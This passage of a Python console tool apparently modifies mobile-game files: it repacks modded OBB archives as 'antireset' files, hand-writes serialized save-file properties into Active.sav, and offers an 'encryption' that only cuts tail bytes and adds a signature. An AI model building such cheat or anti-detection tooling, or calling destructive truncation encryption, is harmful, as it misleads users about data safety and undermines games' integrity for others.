            title="✅ Success",
            border_style="green"
        ))
        return True
    else:
        return False

def antireset_obb_processor():
    """Main ANTIRESET OBB Processor with 2-step process"""
    
    while True:
        org_dir, mod_dir, unzipped_dir, config_dir = create_antireset_directories()
        
        # Check status
        org_obb_exists = len(list(org_dir.glob("*.obb"))) > 0
        mod_obb_exists = len(list(mod_dir.glob("*.obb"))) > 0
        has_extracted = len(list(config_dir.glob("*_info.json"))) > 0
        
        show_banner()
        
        # Build status info
        status_info = f"[green]ORG OBB[/] [dim cyan]{'✔' if org_obb_exists else '✗'}[/]\n"
        status_info += f"[green]MODDED OBB[/] [dim cyan]{'✔' if mod_obb_exists else '✗'}[/]\n"
        status_info += f"[green]UNZIPPED[/] [dim cyan]{'✔' if has_extracted else '✗'}[/]"
        
        if org_obb_exists:
            org_obb = list(org_dir.glob("*.obb"))[0]
            org_size = org_obb.stat().st_size
            status_info += f"\n[green]CACHED SIZE[/] [cyan]{format_size(org_size)}[/]"
        
        antireset_menu_panel = Panel(
            f'[bold cyan]🛡️  ANTIRESET OBB TOOL[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n{status_info}\n\n[bold green][1][/bold green] UNZIP OBB              [bold yellow]➛ Extract modded OBB[/bold yellow]\n[bold green][2][/bold green] MAKE ANTIRESET         [bold yellow]➛ Repack with STORE[/bold yellow]\n\n[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style="cyan",
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(antireset_menu_panel)
        console.print()
        
        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "1":
            step1_unzip_obb()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "2":
            step2_make_antireset()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "0":
            break
        else:
            console.print(Panel(
                f'[bold red]❌ Option {choice} is invalid[/]',
                title='[bold red]Error[/]',
                border_style="red",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')

def handle_antireset_tool():
    """VIP Antireset OBB Tool menu entry point"""
    antireset_obb_processor()

# =============== ACTIVE.SAV MAKER FUNCTIONS (PRO) ===============

ACTIVE_SAV_OUTPUT_PATH   = str(BASE_DIR / "ACTIVE_SAV")
ACTIVE_SAV_OUTPUT_FILE   = os.path.join(ACTIVE_SAV_OUTPUT_PATH, "Float&Int.txt")
ACTIVE_SAV_FILE_PATH     = os.path.join(ACTIVE_SAV_OUTPUT_PATH, "Active.sav")
ACTIVE_SAV_BACKUP_PATH   = os.path.join(ACTIVE_SAV_OUTPUT_PATH, "Backups")
ACTIVE_SAV_TEMPLATE_PATH = os.path.join(ACTIVE_SAV_OUTPUT_PATH, "Templates")

import struct as _struct
import json   as _json

def _asav_ensure_paths():
    os.makedirs(ACTIVE_SAV_OUTPUT_PATH,   exist_ok=True)
    os.makedirs(ACTIVE_SAV_BACKUP_PATH,   exist_ok=True)
    os.makedirs(ACTIVE_SAV_TEMPLATE_PATH, exist_ok=True)

def _asav_le_int(val):    return _struct.pack("<i", val)
def _asav_le_float(val):  return _struct.pack("<f", val)
def _asav_le_double(val): return _struct.pack("<d", val)
def _asav_le_bool(val):   return _struct.pack("<?", val)

def _asav_hexify(b):
    return " ".join(f"{x:02X}" for x in b)

def _asav_name_block(name):
    raw  = name.encode("ascii") + b"\x00"
    size = _asav_le_int(len(raw))
    return _asav_hexify(size), _asav_hexify(raw)

def _asav_write_hex(name, data, prop_type):
    _asav_ensure_paths()
    with open(ACTIVE_SAV_OUTPUT_FILE, "a") as f:
        f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{prop_type}] {name}\n")
        f.write(data + "\n")
        f.write("=" * 80 + "\n")
    console.print(f"\n[bold green]✅ HEX Generated and Saved![/bold green]")
    console.print(f"[cyan]📁 Saved to: {ACTIVE_SAV_OUTPUT_FILE}[/cyan]")

def _asav_append_to_sav(hex_data):
    _asav_ensure_paths()
    with open(ACTIVE_SAV_FILE_PATH, "ab") as f:
        f.write(bytes.fromhex(hex_data.replace(" ", "")))
    _asav_backup()
    console.print(f"\n[bold green]✅ HEX Added to Active.sav[/bold green]")
    console.print(f"[cyan]📁 Updated: {ACTIVE_SAV_FILE_PATH}[/cyan]")

def _asav_backup():
    if os.path.exists(ACTIVE_SAV_FILE_PATH):
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        dest = os.path.join(ACTIVE_SAV_BACKUP_PATH, f"Active_{ts}.sav")
        shutil.copy2(ACTIVE_SAV_FILE_PATH, dest)
        return dest
    return None

def _asav_restore_backup():
    baks = [f for f in os.listdir(ACTIVE_SAV_BACKUP_PATH) if f.endswith(".sav")]
    if not baks:
        return None
    latest = max(baks, key=lambda x: os.path.getctime(os.path.join(ACTIVE_SAV_BACKUP_PATH, x)))
    shutil.copy2(os.path.join(ACTIVE_SAV_BACKUP_PATH, latest), ACTIVE_SAV_FILE_PATH)
    return latest

# ── Property builders ─────────────────────────────────────────────────────────

def _asav_make_float():
    console.print(Panel(Align.center(Text("🎯  FLOAT PROPERTY CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Property Name[/yellow]", console=console).strip()
    while True:
        try:
            value = float(Prompt.ask("[yellow]🔢 Float Value[/yellow]", console=console))
            break
        except ValueError:
            console.print("[red]❌ Invalid input![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size  = _asav_le_int(len(b"FloatProperty\x00"))
    val_hex = _asav_hexify(_asav_le_float(value))
    full = (f"{n_size} {n_hex} "
            f"{_asav_hexify(p_size)} 46 6C 6F 61 74 50 72 6F 70 65 72 74 79 00 "
            f"04 00 00 00 00 00 00 00 00 {val_hex}")
    _asav_write_hex(name, full, "FloatProperty")
    return full

def _asav_make_int():
    console.print(Panel(Align.center(Text("🔢  INTEGER PROPERTY CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Property Name[/yellow]", console=console).strip()
    while True:
        try:
            value = int(Prompt.ask("[yellow]🔢 Integer Value[/yellow]", console=console))
            break
        except ValueError:
            console.print("[red]❌ Invalid input![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size  = _asav_le_int(len(b"IntProperty\x00"))
    val_hex = _asav_hexify(_asav_le_int(value))
    full = (f"{n_size} {n_hex} "
            f"{_asav_hexify(p_size)} 49 6E 74 50 72 6F 70 65 72 74 79 00 "
            f"04 00 00 00 00 00 00 00 00 {val_hex}")
    _asav_write_hex(name, full, "IntProperty")
    return full

def _asav_make_bool():
    console.print(Panel(Align.center(Text("✅  BOOLEAN PROPERTY CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Property Name[/yellow]", console=console).strip()
    while True:
        raw = Prompt.ask("[yellow]🔘 Boolean Value (True/False/1/0)[/yellow]", console=console).strip().lower()
        if raw in ("true","false","1","0","yes","no"):
            value = raw in ("true","1","yes")
            break
        console.print("[red]❌ Invalid![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size  = _asav_le_int(len(b"BoolProperty\x00"))
    val_hex = _asav_hexify(_asav_le_bool(value))
    full = (f"{n_size} {n_hex} {_asav_hexify(p_size)} 42 6F 6F 6C 50 72 6F 70 65 72 74 79 00 "
            f"00 00 00 00 00 00 00 00 01 00 00 00 {val_hex}")
    _asav_write_hex(name, full, "BoolProperty")
    return full

def _asav_make_string():
    console.print(Panel(Align.center(Text("📝  STRING PROPERTY CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name  = Prompt.ask("[yellow]📝 Property Name[/yellow]", console=console).strip()
    value = Prompt.ask("[yellow]📄 String Value[/yellow]",  console=console).strip()
    n_size, n_hex = _asav_name_block(name)
    p_size    = _asav_le_int(len(b"StrProperty\x00"))
    str_bytes = value.encode("utf-8") + b"\x00"
    str_size  = _asav_le_int(len(str_bytes))
    str_hex   = _asav_hexify(str_size) + " " + _asav_hexify(str_bytes)
    full = (f"{n_size} {n_hex} {_asav_hexify(p_size)} 53 74 72 50 72 6F 70 65 72 74 79 00 "
            f"0C 00 00 00 00 00 00 00 {str_hex}")
    _asav_write_hex(name, full, "StringProperty")
    return full

def _asav_make_double():
    console.print(Panel(Align.center(Text("🔬  DOUBLE PROPERTY CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Property Name[/yellow]", console=console).strip()
    while True:
        try:
            value = float(Prompt.ask("[yellow]🔢 Double Value[/yellow]", console=console))
            break
        except ValueError:
            console.print("[red]❌ Invalid input![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size  = _asav_le_int(len(b"DoubleProperty\x00"))
    val_hex = _asav_hexify(_asav_le_double(value))
    full = (f"{n_size} {n_hex} "
            f"{_asav_hexify(p_size)} 44 6F 75 62 6C 65 50 72 6F 70 65 72 74 79 00 "
            f"08 00 00 00 00 00 00 00 {val_hex} 00")
    _asav_write_hex(name, full, "DoubleProperty")
    return full

def _asav_make_vector():
    console.print(Panel(Align.center(Text("📐  VECTOR PROPERTY CREATOR (3D Position)", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Property Name[/yellow]", console=console).strip()
    while True:
        try:
            x = float(Prompt.ask("[yellow]  X[/yellow]", console=console))
            y = float(Prompt.ask("[yellow]  Y[/yellow]", console=console))
            z = float(Prompt.ask("[yellow]  Z[/yellow]", console=console))
            break
        except ValueError:
            console.print("[red]❌ Invalid input![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size  = _asav_le_int(len(b"StructProperty\x00"))
    vec_hex = (_asav_hexify(_asav_le_float(x)) + " " +
               _asav_hexify(_asav_le_float(y)) + " " +
               _asav_hexify(_asav_le_float(z)))
    full = (f"{n_size} {n_hex} "
            f"{_asav_hexify(p_size)} 53 74 72 75 63 74 50 72 6F 70 65 72 74 79 00 "
            f"0C 00 00 00 00 00 00 00 "
            f"07 00 00 00 56 65 63 74 6F 72 00 "
            f"00 00 00 00 00 00 00 00 "
            f"00 00 00 00 00 00 00 00 "
            f"{vec_hex}")
    _asav_write_hex(name, full, "VectorProperty")
    return full

def _asav_make_array_float():
    console.print(Panel(Align.center(Text("📚  ARRAY PROPERTY (FLOAT) CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Array Property Name[/yellow]", console=console).strip()
    while True:
        try:
            num = int(Prompt.ask("[yellow]🔢 Number of Float values[/yellow]", console=console))
            if num > 0: break
        except ValueError: pass
        console.print("[red]❌ Enter a positive number![/red]")
    values = []
    for i in range(num):
        while True:
            try:
                v = float(Prompt.ask(f"  [cyan]Value [{i+1}][/cyan]", console=console))
                values.append(v); break
            except ValueError:
                console.print("[red]❌ Invalid float![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size    = _asav_le_int(len(b"ArrayProperty\x00"))
    count     = _asav_le_int(num)
    inner_len = _asav_le_int(len(b"FloatProperty\x00"))
    parts = [f"{n_size} {n_hex}",
             f"{_asav_hexify(p_size)} 41 72 72 61 79 50 72 6F 70 65 72 74 79 00",
             "00 00 00 00",
             f"{_asav_hexify(inner_len)} 46 6C 6F 61 74 50 72 6F 70 65 72 74 79 00",
             "00 00 00 00", _asav_hexify(count)]
    parts += [_asav_hexify(_asav_le_float(v)) for v in values]
    full = " ".join(parts)
    _asav_write_hex(name, full, "ArrayProperty[Float]")
    return full

def _asav_make_array_int():
    console.print(Panel(Align.center(Text("📊  ARRAY PROPERTY (INTEGER) CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Array Property Name[/yellow]", console=console).strip()
    while True:
        try:
            num = int(Prompt.ask("[yellow]🔢 Number of Integer values[/yellow]", console=console))
            if num > 0: break
        except ValueError: pass
        console.print("[red]❌ Enter a positive number![/red]")
    values = []
    for i in range(num):
        while True:
            try:
                v = int(Prompt.ask(f"  [cyan]Value [{i+1}][/cyan]", console=console))
                values.append(v); break
            except ValueError:
                console.print("[red]❌ Invalid integer![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size    = _asav_le_int(len(b"ArrayProperty\x00"))
    count     = _asav_le_int(num)
    inner_len = _asav_le_int(len(b"IntProperty\x00"))
    parts = [f"{n_size} {n_hex}",
             f"{_asav_hexify(p_size)} 41 72 72 61 79 50 72 6F 70 65 72 74 79 00",
             "00 00 00 00",
             f"{_asav_hexify(inner_len)} 49 6E 74 50 72 6F 70 65 72 74 79 00",
             "00 00 00 00", _asav_hexify(count)]
    parts += [_asav_hexify(_asav_le_int(v)) for v in values]
    full = " ".join(parts)
    _asav_write_hex(name, full, "ArrayProperty[Int]")
    return full

def _asav_make_map_int_int():
    console.print(Panel(Align.center(Text("🗺️   MAP PROPERTY (INT → INT) CREATOR", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
    name = Prompt.ask("[yellow]📝 Map Property Name[/yellow]", console=console).strip()
    while True:
        try:
            num = int(Prompt.ask("[yellow]🔢 Number of Key-Value pairs[/yellow]", console=console))
            if num > 0: break
        except ValueError: pass
        console.print("[red]❌ Enter a positive number![/red]")
    pairs = []
    for i in range(num):
        console.print(f"\n  [yellow]Pair [{i+1}]:[/yellow]")
        while True:
            try:
                k = int(Prompt.ask("    [green]Key[/green]",   console=console))
                v = int(Prompt.ask("    [green]Value[/green]", console=console))
                pairs.append((k, v)); break
            except ValueError:
                console.print("[red]❌ Invalid integers![/red]")
    n_size, n_hex = _asav_name_block(name)
    p_size = _asav_le_int(len(b"MapProperty\x00"))
    kt_len = _asav_le_int(len(b"IntProperty\x00"))
    vt_len = _asav_le_int(len(b"IntProperty\x00"))
    num_b  = _asav_le_int(num)
    parts = [f"{n_size} {n_hex}",
             f"{_asav_hexify(p_size)} 4D 61 70 50 72 6F 70 65 72 74 79 00",
             "00 00 00 00",
             f"{_asav_hexify(kt_len)} 49 6E 74 50 72 6F 70 65 72 74 79 00",
             f"{_asav_hexify(vt_len)} 49 6E 74 50 72 6F 70 65 72 74 79 00",
             "00 00 00 00", _asav_hexify(num_b)]
    for k, v in pairs:
        parts.append(_asav_hexify(_asav_le_int(k)))
        parts.append(_asav_hexify(_asav_le_int(v)))
    full = " ".join(parts)
    _asav_write_hex(name, full, "MapProperty[Int->Int]")
    return full

# ── Sub-menus ──────────────────────────────────────────────────────────────────

def _asav_add_property_to_sav():
    PROP_MAP = {
        "1": ("Float",         _asav_make_float),
        "2": ("Integer",       _asav_make_int),
        "3": ("Boolean",       _asav_make_bool),
        "4": ("String",        _asav_make_string),
        "5": ("Double",        _asav_make_double),
        "6": ("Vector",        _asav_make_vector),
        "7": ("Array[Float]",  _asav_make_array_float),
        "8": ("Array[Int]",    _asav_make_array_int),
        "9": ("Map[Int->Int]", _asav_make_map_int_int),
    }
    while True:
        show_banner()
        console.print(Panel(
            Align.center(Text("💾  ADD PROPERTY TO ACTIVE.SAV", style="bold white")),
            box=box.HEAVY_HEAD, border_style="magenta", padding=(0, 0),
        ))
        t = Table(box=box.SIMPLE_HEAD, border_style="magenta",
                  header_style="bold magenta", padding=(0, 0), expand=False)
        t.add_column("  #", style="bold yellow", justify="center", width=4)
        t.add_column("PROPERTY TYPE", style="bold white", width=30)
        for num, label in [("1","🎯  FloatProperty"), ("2","🔢  IntProperty"),
                           ("3","✅  BoolProperty"),  ("4","📝  StringProperty"),
                           ("5","🔬  DoubleProperty"), ("6","📐  VectorProperty"),
                           ("7","📚  ArrayProperty (Float)"), ("8","📊  ArrayProperty (Int)"),
                           ("9","🗺️   MapProperty (Int→Int)"), ("",""), ("0","🔙  Back")]:
            t.add_row(num, label)
        console.print(Align.center(t))
        console.print()
        choice = Prompt.ask("[bold yellow]  ▶ Select property type[/bold yellow]", console=console).strip()
        if choice == "0":
            break
        if choice not in PROP_MAP:
            console.print(Panel("[bold red]  ✗  Invalid option.[/bold red]",
                                box=box.HEAVY_HEAD, border_style="red", padding=(0, 0)))
            input("Press Enter...")
            continue
        label, builder = PROP_MAP[choice]
        hex_data = builder()
        if hex_data:
            console.print()
            with Progress(SpinnerColumn(style="bold magenta"),
                          TextColumn("[bold magenta]  Writing to Active.sav...[/bold magenta]"),
                          BarColumn(), TaskProgressColumn(),
                          console=console, transient=True) as prog:
                task = prog.add_task("write", total=100)
                for _ in range(100):
                    time.sleep(0.01)
                    prog.update(task, advance=1)
            _asav_append_to_sav(hex_data)
            another = Prompt.ask(
                f"[yellow]  Add another {label}Property? (y/n)[/yellow]",
                console=console).strip().lower()
            if another != "y":
                continue

def _asav_view_active_sav():
    console.print(Panel(Align.center(Text("👁️   ACTIVE.SAV VIEWER", style="bold white")),
                        box=box.HEAVY_HEAD, border_style="blue", padding=(0, 0)))
    if not os.path.exists(ACTIVE_SAV_FILE_PATH):
        console.print(Panel("[bold red]❌ No Active.sav file found![/bold red]",
                            border_style="red", padding=(0, 0)))
        return
    fsize = os.path.getsize(ACTIVE_SAV_FILE_PATH)
    mtime = datetime.fromtimestamp(os.path.getmtime(ACTIVE_SAV_FILE_PATH)).strftime("%Y-%m-%d %H:%M:%S")
    console.print(f"  [cyan]📁 File:[/cyan] {ACTIVE_SAV_FILE_PATH}")
    console.print(f"  [cyan]📏 Size:[/cyan] {fsize} bytes")
    console.print(f"  [cyan]🕐 Modified:[/cyan] {mtime}\n")
    with open(ACTIVE_SAV_FILE_PATH, "rb") as f:
        data = f.read(256)
    hex_table = Table(title="HEX DUMP — First 256 bytes",
                      box=box.SIMPLE_HEAD, border_style="green", padding=(0, 1))
    hex_table.add_column("OFFSET", style="dim white",  justify="right")
    hex_table.add_column("HEX",    style="green")
    hex_table.add_column("ASCII",  style="cyan")
    for i in range(0, len(data), 16):
        chunk    = data[i:i+16]
        hex_part = " ".join(f"{b:02X}" for b in chunk)
        asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        hex_table.add_row(f"{i:04X}", hex_part, asc_part)
    console.print(hex_table)
    if fsize > 256:
        console.print(f"  [dim]... and {fsize - 256} more bytes[/dim]")

def _asav_file_management():
    while True:
        show_banner()
        console.print(Panel(Align.center(Text("📁  FILE MANAGEMENT", style="bold white")),
                            box=box.HEAVY_HEAD, border_style="yellow", padding=(0, 0)))
        t = Table(box=box.SIMPLE_HEAD, border_style="yellow",
                  header_style="bold yellow", padding=(0, 0), expand=False)
        t.add_column("  #", style="bold yellow", justify="center", width=4)
        t.add_column("ACTION", style="bold white", width=30)
        for row in [("1","💾  Backup Active.sav"), ("2","♻️   Restore from Backup"),
                    ("3","📤  Export to JSON"),    ("4","🗑️   Delete Active.sav"),
                    ("",""), ("0","🔙  Back")]:
            t.add_row(*row)
        console.print(Align.center(t))
        console.print()
        choice = Prompt.ask("[bold yellow]  ▶ Select[/bold yellow]", console=console).strip()
        if choice == "1":
            bak = _asav_backup()
            if bak: console.print(f"[green]✅ Backup created: {bak}[/green]")
            else:   console.print("[red]❌ No Active.sav found![/red]")
        elif choice == "2":
            res = _asav_restore_backup()
            if res: console.print(f"[green]✅ Restored from: {res}[/green]")
            else:   console.print("[red]❌ No backup found![/red]")
        elif choice == "3":
            if not os.path.exists(ACTIVE_SAV_FILE_PATH):
                console.print("[red]❌ No Active.sav found![/red]")
            else:
                data = {"file": ACTIVE_SAV_FILE_PATH,
                        "size": os.path.getsize(ACTIVE_SAV_FILE_PATH),
                        "export_time": datetime.now().isoformat(),
                        "backup_count": len([f for f in os.listdir(ACTIVE_SAV_BACKUP_PATH) if f.endswith(".sav")])}
                jf = os.path.join(ACTIVE_SAV_OUTPUT_PATH, f"Active_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
                with open(jf, "w") as f:
                    _json.dump(data, f, indent=2)
                console.print(f"[green]✅ Exported to: {jf}[/green]")
        elif choice == "4":
            confirm = Prompt.ask("[red]⚠️  Delete Active.sav? (yes/no)[/red]", console=console)
            if confirm.lower() == "yes":
                if os.path.exists(ACTIVE_SAV_FILE_PATH):
                    os.remove(ACTIVE_SAV_FILE_PATH)
                    console.print("[green]✅ Active.sav deleted![/green]")
                else:
                    console.print("[red]❌ File not found![/red]")
        elif choice == "0":
            break
        else:
            console.print(Panel("[bold red]  ✗  Invalid option.[/bold red]",
                                box=box.HEAVY_HEAD, border_style="red", padding=(0, 0)))
        input("Press Enter to continue...")

def _asav_template_manager():
    while True:
        show_banner()
        console.print(Panel(Align.center(Text("📋  TEMPLATE MANAGER", style="bold white")),
                            box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
        t = Table(box=box.SIMPLE_HEAD, border_style="cyan",
                  header_style="bold cyan", padding=(0, 0), expand=False)
        t.add_column("  #", style="bold yellow", justify="center", width=4)
        t.add_column("ACTION", style="bold white", width=28)
        for row in [("1","💾  Save Template"), ("2","📂  Load Template"),
                    ("3","📋  List Templates"), ("",""), ("0","🔙  Back")]:
            t.add_row(*row)
        console.print(Align.center(t))
        console.print()
        choice = Prompt.ask("[bold yellow]  ▶ Select[/bold yellow]", console=console).strip()
        if choice == "1":
            nm = Prompt.ask("[yellow]Template Name[/yellow]",    console=console).strip()
            pt = Prompt.ask("[yellow]Property Type[/yellow]",    console=console).strip()
            pn = Prompt.ask("[yellow]Property Name[/yellow]",    console=console).strip()
            pv = Prompt.ask("[yellow]Property Value[/yellow]",   console=console).strip()
            tmpl = {"name": nm, "type": pt, "property_name": pn, "value": pv,
                    "created": datetime.now().isoformat()}
            tf = os.path.join(ACTIVE_SAV_TEMPLATE_PATH, f"{nm}.json")
            with open(tf, "w") as f:
                _json.dump(tmpl, f, indent=2)
            console.print(f"[green]✅ Template saved: {tf}[/green]")
        elif choice == "2":
            tmpls = [f.replace(".json","") for f in os.listdir(ACTIVE_SAV_TEMPLATE_PATH) if f.endswith(".json")]
            if not tmpls:
                console.print("[red]❌ No templates found![/red]")
            else:
                for i, tm in enumerate(tmpls, 1):
                    console.print(f"  [green]{i}.[/green] {tm}")
                try:
                    idx = int(Prompt.ask("[yellow]Select template[/yellow]", console=console)) - 1
                    if 0 <= idx < len(tmpls):
                        with open(os.path.join(ACTIVE_SAV_TEMPLATE_PATH, f"{tmpls[idx]}.json")) as f:
                            tmpl = _json.load(f)
                        console.print(f"[green]✅ Loaded: {tmpl['name']}[/green]")
                        console.print(f"[cyan]Type: {tmpl['type']}, Name: {tmpl['property_name']}, Value: {tmpl['value']}[/cyan]")
                    else:
                        console.print("[red]❌ Invalid selection![/red]")
                except ValueError:
                    console.print("[red]❌ Invalid input![/red]")
        elif choice == "3":
            tmpls = [f.replace(".json","") for f in os.listdir(ACTIVE_SAV_TEMPLATE_PATH) if f.endswith(".json")]
            if tmpls:
                console.print(f"\n[cyan]📁 Templates in {ACTIVE_SAV_TEMPLATE_PATH}:[/cyan]")
                for tm in tmpls:
                    console.print(f"  [green]•[/green] {tm}")
            else:
                console.print("[red]❌ No templates found![/red]")
        elif choice == "0":
            break
        else:
            console.print(Panel("[bold red]  ✗  Invalid option.[/bold red]",
                                box=box.HEAVY_HEAD, border_style="red", padding=(0, 0)))
        input("Press Enter to continue...")

def handle_active_sav_maker():
    """Active.sav Maker — VIP menu matching main tool style."""
    _asav_ensure_paths()

    PROP_MAP = {
        "1": ("Float",         _asav_make_float),
        "2": ("Integer",       _asav_make_int),
        "3": ("Boolean",       _asav_make_bool),
        "4": ("String",        _asav_make_string),
        "5": ("Double",        _asav_make_double),
        "6": ("Vector",        _asav_make_vector),
        "7": ("Array[Float]",  _asav_make_array_float),
        "8": ("Array[Int]",    _asav_make_array_int),
        "9": ("Map[Int->Int]", _asav_make_map_int_int),
    }

    while True:
        show_banner()

        # Section header — green to distinguish from PAK tools
        now = datetime.now()
        time_info = f"🕐 {now.strftime('%H:%M:%S')} | 📅 {now.strftime('%Y-%m-%d')}"
        
        asav_menu_panel = Panel(
            f'[bold cyan]🧩  ACTIVE.SAV MAKER[/bold cyan]\n[cyan]{"─" * 32}[/]\n[green]Path[/]: [white]{BASE_DIR / "ACTIVE_SAV"}[/white]\n[dim]{time_info}[/]\n\n[bold green][1][/bold green] FLOAT PROPERTY          [bold yellow]➛ FloatProperty[/bold yellow]\n[bold green][2][/bold green] INTEGER PROPERTY        [bold yellow]➛ IntProperty[/bold yellow]\n[bold green][3][/bold green] BOOLEAN PROPERTY        [bold yellow]➛ BoolProperty[/bold yellow]\n[bold green][4][/bold green] STRING PROPERTY         [bold yellow]➛ StringProperty[/bold yellow]\n[bold green][5][/bold green] DOUBLE PROPERTY         [bold yellow]➛ DoubleProperty[/bold yellow]\n[bold green][6][/bold green] VECTOR PROPERTY         [bold yellow]➛ VectorProperty[/bold yellow]\n[bold green][7][/bold green] ARRAY[FLOAT]            [bold yellow]➛ ArrayProperty Float[/bold yellow]\n[bold green][8][/bold green] ARRAY[INT]              [bold yellow]➛ ArrayProperty Int[/bold yellow]\n[bold green][9][/bold green] MAP[INT→INT]            [bold yellow]➛ MapProperty[/bold yellow]\n[bold green][10][/bold green] ADD TO ACTIVE.SAV       [bold yellow]➛ File Operations[/bold yellow]\n[bold green][11][/bold green] FILE MANAGEMENT         [bold yellow]➛ Manage Files[/bold yellow]\n[bold green][12][/bold green] TEMPLATE MANAGER        [bold yellow]➛ Templates[/bold yellow]\n[bold green][13][/bold green] VIEW ACTIVE.SAV         [bold yellow]➛ View Content[/bold yellow]\n\n[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style="green",
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(asav_menu_panel)
        console.print()

        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break

        if choice in PROP_MAP:
            _, builder = PROP_MAP[choice]
            builder()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "10":
            _asav_add_property_to_sav()
        elif choice == "11":
            _asav_file_management()
        elif choice == "12":
            _asav_template_manager()
        elif choice == "13":
            _asav_view_active_sav()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "0":
            break
        else:
            console.print(Panel(
                f'[bold red]❌ Option {choice} is invalid[/]',
                title='[bold red]Error[/]',
                border_style="red",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')

# =============== OBB ENCRYPTION TOOL FUNCTIONS (UPDATED WITH CUSTOM ENCRYPTION) ===============

# Encryption level mapping - bytes to remove from end
ENCRYPTION_LEVELS = {
    1: {"name": "Lightest — minimal tail removal", "bytes": 64, "bar": "█░░░░░░░░░"},
    2: {"name": "Very light", "bytes": 128, "bar": "██░░░░░░░░"},
    3: {"name": "Light", "bytes": 256, "bar": "███░░░░░░░"},
    4: {"name": "Moderate", "bytes": 512, "bar": "████░░░░░░"},
    5: {"name": "Medium — balanced", "bytes": 1024, "bar": "█████░░░░░"},
    6: {"name": "Strong", "bytes": 2048, "bar": "██████░░░░"},
    7: {"name": "Very strong", "bytes": 4096, "bar": "███████░░░"},
    8: {"name": "Heavy", "bytes": 8192, "bar": "████████░░"},
    9: {"name": "Very heavy", "bytes": 16384, "bar": "█████████░"},
    10: {"name": "Maximum — deepest tail removal", "bytes": 32768, "bar": "██████████"},
}

def ensure_encryption_dirs():
    """Create all encryption directories"""
    enc_base = BASE_DIR / 'ENCRYPTION'
    for sub in ['NORMAL_ENC', 'CUSTOM_ENC', 'DECRYPT']:
        for folder in ['INPUT', 'OUTPUT']:
            (enc_base / sub / folder).mkdir(parents=True, exist_ok=True)

def custom_encrypt_file(src_path, dst_path, level, custom_key=None):
    """
    Custom encryption that removes tail bytes and adds signature.
    This is a ONE-WAY operation - cannot be reversed!
    """
    try:
        bytes_to_remove = ENCRYPTION_LEVELS[level]["bytes"]
        
        # Read source file
        with open(src_path, 'rb') as f:
            data = bytearray(f.read())
        
        original_size = len(data)
        
        # Remove bytes from end based on level
        # But don't remove more than 90% of file
        max_remove = int(original_size * 0.9)
        actual_remove = min(bytes_to_remove, max_remove)
        
        if actual_remove > 0:
            data = data[:-actual_remove]
        
        # Create signature to add at end
        signature = bytearray()
        
        # Add encryption level marker (1 byte)
        signature.append(level)
        
        # Add actual bytes removed (4 bytes, little-endian)
        signature.extend(struct.pack('<I', actual_remove))
        
        # Add original file size (8 bytes, little-endian)
        signature.extend(struct.pack('<Q', original_size))
        
        # Add custom key or random bytes
        if custom_key:
            key_bytes = custom_key.encode('utf-8')
            # Pad to 20 bytes
            if len(key_bytes) < 20:
                key_bytes = key_bytes + b'\x00' * (20 - len(key_bytes))
            else:
                key_bytes = key_bytes[:20]
        else:
            # Generate random 20 bytes
            key_bytes = bytes(random.randint(0, 255) for _ in range(20))
        
        signature.extend(key_bytes)
        
        # Add timestamp (4 bytes)
        signature.extend(struct.pack('<I', int(time.time())))
        
        # Add a checksum of original data (first 4 bytes of MD5)
        md5_hash = hashlib.md5(data).digest()[:4]
        signature.extend(md5_hash)
        
        # Total signature size: 1 + 4 + 8 + 20 + 4 + 4 = 41 bytes
        data.extend(signature)
        
        # Write encrypted file
        with open(dst_path, 'wb') as f:
            f.write(data)
        
        return True
        
    except Exception as e:
        console.print(f"[red]Encryption error: {e}[/red]")
        return False

def normal_encrypt_file(src_path, dst_path):
    """Normal encryption - adds footer bytes"""
    try:
        shutil.copy2(src_path, dst_path)
